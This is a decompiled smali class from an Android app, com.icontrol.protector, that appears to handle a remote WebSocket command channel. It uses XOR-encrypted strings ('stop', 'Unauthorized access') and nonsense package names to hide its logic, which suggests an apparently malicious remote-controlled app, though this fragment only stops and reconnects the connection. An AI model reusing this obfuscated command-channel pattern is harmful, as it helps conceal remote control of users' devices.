.class Lcom/icontrol/protector/WebBrowser$c;
.super Lntidisestablish/neumonoul/floccinaucinih/o70;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WebBrowser;->b(Landroid/content/Context;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Lcom/icontrol/protector/WebBrowser;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/WebBrowser;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    iput-object p2, p0, Lcom/icontrol/protector/WebBrowser$c;->a:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/WebBrowser$c;->b:Ljava/lang/String;

    invoke-direct {p0}, Lntidisestablish/neumonoul/floccinaucinih/o70;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V
    .locals 0

    .line 1
    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/WebBrowser;->e(Lcom/icontrol/protector/WebBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    invoke-static {p1}, Lcom/icontrol/protector/WebBrowser;->f(Lcom/icontrol/protector/WebBrowser;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    return-void
.end method

.method public c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 0

    .line 1
    invoke-virtual {p2}, Ljava/lang/Throwable;->printStackTrace()V

    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/WebBrowser;->e(Lcom/icontrol/protector/WebBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    return-void
.end method

.method public d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V
    .locals 4

    .line 1
    :try_start_0
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    const/4 p2, 0x4

    new-array v0, p2, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x5

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v0, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-array p2, p2, [B

    fill-array-data p2, :array_4

    new-array v0, v1, [B

    fill-array-data v0, :array_5

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-nez p2, :cond_0

    const/16 p2, 0x13

    new-array p2, p2, [B

    fill-array-data p2, :array_6

    new-array v0, v1, [B

    fill-array-data v0, :array_7

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_1

    :cond_0
    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    const/4 p2, 0x0

    invoke-static {p1, p2}, Lcom/icontrol/protector/WebBrowser;->e(Lcom/icontrol/protector/WebBrowser;Lntidisestablish/neumonoul/floccinaucinih/m70;)Lntidisestablish/neumonoul/floccinaucinih/m70;

    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    invoke-static {p1}, Lcom/icontrol/protector/WebBrowser;->f(Lcom/icontrol/protector/WebBrowser;)Lntidisestablish/neumonoul/floccinaucinih/ks;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ks;->o()Lntidisestablish/neumonoul/floccinaucinih/ce;

    move-result-object p1

    invoke-virtual {p1}, Lntidisestablish/neumonoul/floccinaucinih/ce;->c()Ljava/util/concurrent/ExecutorService;

    move-result-object p1

    invoke-interface {p1}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->a:Landroid/content/Context;

    sget-object p2, Lntidisestablish/neumonoul/floccinaucinih/ab;->V:Ljava/lang/String;

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_1
    return-void

    :array_0
    .array-data 1
        -0x38t
        -0x74t
        0x79t
        0x70t
    .end array-data

    :array_1
    .array-data 1
        -0x44t
        -0xbt
        0x9t
        0x15t
        0x17t
        -0x1et
        0x67t
        -0x58t
    .end array-data

    :array_2
    .array-data 1
        0x5et
        0x5t
        -0x9t
        -0x6t
        -0x4bt
    .end array-data

    nop

    :array_3
    .array-data 1
        0x3bt
        0x68t
        -0x79t
        -0x72t
        -0x34t
        -0x3ct
        0x30t
        0x65t
    .end array-data

    :array_4
    .array-data 1
        0x7ft
        -0x7et
        0x3bt
        0x74t
    .end array-data

    :array_5
    .array-data 1
        0xct
        -0xat
        0x54t
        0x4t
        0x10t
        -0x3ct
        -0x10t
        0x28t
    .end array-data

    :array_6
    .array-data 1
        -0x4ft
        0x25t
        0x5ct
        0x33t
        0x58t
        -0x7et
        -0x4ct
        -0x36t
        -0x73t
        0x31t
        0x58t
        0x22t
        0xct
        -0x75t
        -0x48t
        -0x25t
        -0x7ft
        0x38t
        0x4et
    .end array-data

    :array_7
    .array-data 1
        -0x1ct
        0x4bt
        0x3dt
        0x46t
        0x2ct
        -0x16t
        -0x25t
        -0x48t
    .end array-data
.end method

.method public f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 1

    .line 1
    iget-object p1, p0, Lcom/icontrol/protector/WebBrowser$c;->c:Lcom/icontrol/protector/WebBrowser;

    iget-object p2, p0, Lcom/icontrol/protector/WebBrowser$c;->a:Landroid/content/Context;

    iget-object v0, p0, Lcom/icontrol/protector/WebBrowser$c;->b:Ljava/lang/String;

    invoke-static {p1, p2, v0}, Lcom/icontrol/protector/WebBrowser;->d(Lcom/icontrol/protector/WebBrowser;Landroid/content/Context;Ljava/lang/String;)V

    return-void
.end method
